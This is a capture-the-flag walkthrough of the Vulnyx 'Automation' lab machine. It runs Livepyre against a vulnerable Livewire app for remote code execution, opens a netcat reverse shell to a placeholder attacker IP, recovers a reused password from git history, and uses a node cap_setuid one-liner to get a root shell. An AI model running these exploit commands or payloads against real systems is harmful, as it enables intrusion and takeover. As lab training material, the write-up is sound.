# Vulnyx: Automation

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `Alherrero` |
| **Tools used** | `nmap` · `ffuf` · `Livepyre` · `nc` · `git` · `hydra` |
| **Tags** | `#VHostFuzzing` `#Laravel` `#Livewire` `#RCE` `#GitLeak` `#LinuxCapabilities` |
| **URL** | https://vulnyx.com/machines/ |

Virtual host fuzzing turns up a subdomain running a Laravel ticketing app built on Livewire, vulnerable to a public RCE (CVE-2025-54068). That lands a shell, from which an exposed `.git` directory for the app's development copy leaks a password through its commit history — reused directly as `alex`'s SSH password. Root comes from a Linux capability left on the `node` binary, letting it set its own UID directly.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn automation.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:27:C4:E6 (Oracle VirtualBox virtual NIC)
```

Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:

```bash
$ sudo nmap -p 22,80 -sCV automation.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 cf:60:aa:ae:85:91:09:65:97:d1:9f:b0:6f:3d:0a:a0 (ECDSA)
|_  256 75:c8:a7:cd:e6:e6:14:2b:13:56:ff:ca:fb:32:a4:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Automation
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 08:00:27:27:C4:E6 (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


### Web Enumeration

The main page:

```
http://automation.nyx/
```
<img src="../Images/automation/Pasted image 20260727235715.png"/>

A content discovery scan against the main site:

```bash
$ ffuf -u http://automation.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

.html                 [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 224ms]
.php                  [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 235ms]
                      [Status: 200, Size: 19996, Words: 3603, Lines: 511, Duration: 245ms]
index.html            [Status: 200, Size: 19996, Words: 3603, Lines: 511, Duration: 1289ms]
.php                  [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4ms]
.html                 [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 9ms]
                      [Status: 200, Size: 19996, Words: 3603, Lines: 511, Duration: 64ms]
```

A virtual host scan is run as well, fuzzing the `Host` header instead of the path — this catches subdomains that wouldn't show up in any directory listing:

```bash
$ ffuf -u http://automation.nyx -H "Host: FUZZ.automation.nyx" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18

tickets                [Status: 200, Size: 12126, Words: 1080, Lines: 227, Duration: 6688ms]
:: Progress: [19966/19966] :: Job [1/1] :: 884 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

> **Subdomain:** `http://tickets.automation.nyx`

### The Tickets App

```
http://tickets.automation.nyx/
```
<img src="../Images/automation/Pasted image 20260727235815.png"/>

Reviewing the form's requests shows a `/livewire/update` endpoint — a signature of Laravel Livewire, a framework for building dynamic UIs without writing separate JavaScript:

```http
POST /livewire/update HTTP/1.1
Host: tickets.automation.nyx
Content-type: application/json
X-Livewire:
Cookie: XSRF-TOKEN=...; laravel-session=...
```
<img src="../Images/automation/Pasted image 20260727235843.png"/>

## Initial Access

### RCE via CVE-2025-54068

Livewire's version in use is vulnerable to a known CVE, with a public exploit tool available:

> **Exploit:** CVE-2025-54068 (`https://github.com/synacktiv/Livepyre`)

```bash
$ git clone https://github.com/synacktiv/Livepyre
$ pip3 install -r requirements.txt
```
```bash
$ python3 Livepyre.py -u http://tickets.automation.nyx
[INFO] The remote livewire version is v3.6.2, the target is vulnerable.
[INFO] Found snapshot(s). Running exploit.
[INFO] Running exploit without APP_KEY.
[INFO] Found 1 snapshot(s) available.
[INFO] Found 23 possible param(s).
[INFO] Checking for parameter(s) with object type to avoid bruteforce.
[WARNING] No param with object type was found, attempting bruteforce.
[INFO] Trying to gain RCE with param activeTab.
[ERROR] Casting as array failed.
[INFO] Trying to gain RCE with param appMode.
[INFO] Sending payload system('id') to livewire.
[INFO] Payload works, output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

With the target confirmed vulnerable, the same tool triggers a reverse shell instead of just a probe:

```bash
$ python3 Livepyre.py -u "http://tickets.automation.nyx" -p "busybox nc <ATTACKER_IP> <PORT> -e /bin/sh"
[INFO] The remote livewire version is v3.6.2, the target is vulnerable.
[INFO] Found snapshot(s). Running exploit.
[INFO] Running exploit without APP_KEY.
[INFO] Found 1 snapshot(s) available.
[INFO] Found 23 possible param(s).
[INFO] Checking for parameter(s) with object type to avoid bruteforce.
[WARNING] No param with object type was found, attempting bruteforce.
[INFO] Trying to gain RCE with param activeTab.
[ERROR] Casting as array failed.
[INFO] Trying to gain RCE with param appMode.
[INFO] Sending payload system('busybox nc <ATTACKER_IP> <PORT> -e /bin/sh') to livewire.
```

### Shell as www-data

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [automation.nyx] 59162
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

```bash
www-data@automation:/var/www$ ls -l /home
total 4
drwxr-x--- 5 alex alex 4096 Feb 24 08:16 alex
www-data@automation:/var/www$ ls /home/alex/
ls: cannot open directory '/home/alex/': Permission denied
```

## Lateral Movement

### Loot: An Exposed `.git` Directory

```bash
www-data@automation:/var/www$ find / -user alex 2>/dev/null
/opt/tickets-development
/opt/tickets-development/storage
/opt/tickets-development/.gitignore
/opt/tickets-development/.editorconfig
/opt/tickets-development/package.json
/opt/tickets-development/routes
/opt/tickets-development/.env.example
/opt/tickets-development/bootstrap
/opt/tickets-development/vite.config.js
/opt/tickets-development/.env
/opt/tickets-development/public
/opt/tickets-development/composer.json
/opt/tickets-development/database
/opt/tickets-development/app
/opt/tickets-development/app/Livewire/TicketChecker.php
/opt/tickets-development/.gitattributes
/opt/tickets-development/phpunit.xml
/opt/tickets-development/config
/opt/tickets-development/README.md
/opt/tickets-development/vendor
/opt/tickets-development/.git
/opt/tickets-development/.git/index
/opt/tickets-development/.git/info
/opt/tickets-development/.git/info/exclude
/opt/tickets-development/.git/COMMIT_EDITMSG
/opt/tickets-development/.git/HEAD
/opt/tickets-development/.git/ORIG_HEAD
/opt/tickets-development/.git/hooks
```
```bash
www-data@automation:/var/www$ ls -l /opt/tickets-development/.git
total 52
-rw-rw-r--  1 alex alex   38 Feb 22 15:30 COMMIT_EDITMSG
-rw-rw-r--  1 alex alex   23 Feb 22 15:22 HEAD
-rw-rw-r--  1 alex alex   41 Feb 22 15:27 ORIG_HEAD
drwxrwxr-x  2 alex alex 4096 Feb 22 15:22 branches
-rw-rw-r--  1 alex alex   92 Feb 22 15:22 config
-rw-rw-r--  1 alex alex   73 Feb 22 15:22 description
drwxrwxr-x  2 alex alex 4096 Feb 22 15:22 hooks
-rw-rw-r--  1 alex alex 7124 Feb 24 08:16 index
drwxrwxr-x  2 alex alex 4096 Feb 22 15:22 info
drwxrwxr-x  3 alex alex 4096 Feb 22 15:24 logs
drwxrwxr-x 84 alex alex 4096 Feb 24 08:16 objects
drwxrwxr-x  4 alex alex 4096 Feb 22 15:22 refs
```

> **Directory:** `/opt/tickets-development/.git`

A development copy of the app has its `.git` directory sitting on disk and readable. Git normally refuses to operate on a repository it doesn't consider "safe" — owned by a different user than the one running the command — so it's copied out and explicitly marked as trusted before working with it:

```bash
www-data@automation:/var/www$ cp -r /opt/tickets-development/.git /tmp
www-data@automation:/var/www$ export HOME=/tmp
www-data@automation:/var/www$ git config --global --add safe.directory /tmp
```

The commit history is browsed for anything sensitive that might have been removed later:

```bash
www-data@automation:/tmp$ git --no-pager log
commit baa7a8b4e9b72534ee52d71894109f451c6cca0c (HEAD -> master)
Author: alex <alex@automation.nyx>
Date:   Sun Feb 22 15:30:42 2026 +0000

    Changed database from MySQL to SQLite

commit 0c8fa0d1fea9643f7f731fb9c08c273f57388e38
Author: alex <alex@automation.nyx>
Date:   Sun Feb 22 15:24:16 2026 +0000

    Initial commit with current files
www-data@automation:/tmp$ git checkout 0c8fa0d1fea9643f7f731fb9c08c273f57388e38
```
```bash
www-data@automation:/tmp$ ls -la
total 24
drwxrwxrwt  3 root     root     4096 Jul 27 21:41 .
drwxr-xr-x 23 root     root     4096 Feb 20 11:22 ..
-rwxr-xr-x  1 www-data www-data 1149 Jul 27 21:41 .env
drwxr-xr-x  8 www-data www-data 4096 Jul 27 21:41 .git
-rw-r--r--  1 www-data www-data   63 Jul 27 21:41 .gitconfig
-rw-------  1 www-data www-data   20 Jul 27 21:39 .lesshst
www-data@automation:/tmp$ cat /tmp/.env
```
```Plaintext
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=tickets_db
DB_USERNAME=tickets
DB_PASSWORD=24!#saDf!f2ar8sA#
```

A `.env` file from an earlier commit holds a plaintext password:

> **Password:** `24!#saDf!f2ar8sA#`

### Shell as alex

The password is validated against SSH:

```bash
$ hydra -l alex -p '24!#saDf!f2ar8sA#' ssh://automation.nyx

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-27 17:43:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://automation.nyx:22/
[22][ssh] host: automation.nyx   login: alex   password: 24!#saDf!f2ar8sA#
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-27 17:43:32
```

It works — the same password used for the app is reused as `alex`'s system password:

> **Credentials:** `alex:24!#saDf!f2ar8sA#`

```bash
$ ssh alex@automation.nyx
```

```bash
alex@automation:~$ id
uid=1000(alex) gid=1000(alex) groups=1000(alex)
alex@automation:~$ ls -l /home/alex/
total 4
-rw-rw-r-- 1 alex alex 33 Feb 22 16:03 user.txt
alex@automation:~$ cat /home/alex/user.txt
0254bb89c36e6c2517e9742116669643
```

> **User flag:** `0254bb89c36e6c2517e9742116669643`

## Privilege Escalation

### `cap_setuid` on `node`

```bash
alex@automation:~$ getcap -r /
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/bin/node cap_setuid=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
```

Linux capabilities let a binary hold specific privileged abilities without needing the full SUID-root treatment. `cap_setuid` in particular allows a process to change its own UID directly — if `node` carries that capability, a short script is enough to become root and spawn a shell that inherits it:

```bash
alex@automation:~$ node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
```

```bash
root@automation:~# id
uid=0(root) gid=0(root) groups=1000(alex)
root@automation:~# ls -l /root
total 4
-rw-r--r-- 1 root root 33 Feb 22 16:03 root.txt
root@automation:~# cat /root/root.txt
f18239c078cc965d0c266337f32c8616
```

> **Root flag:** `f18239c078cc965d0c266337f32c8616`

## Takeaways

- Virtual host fuzzing is essential on any target with a custom domain — content that never appears under the main hostname can be sitting entirely on a subdomain that DNS alone wouldn't reveal.
- An exposed `.git` directory is effectively the entire history of a project, not just its current state — anything ever committed and later "removed" is still sitting in an earlier commit, `.env` files included.
- Linux capabilities are an underused but powerful escalation vector — `cap_setuid` on an interpreter like `node`, `python`, or `perl` is functionally equivalent to a SUID binary, just without the SUID bit itself to flag it during a routine search.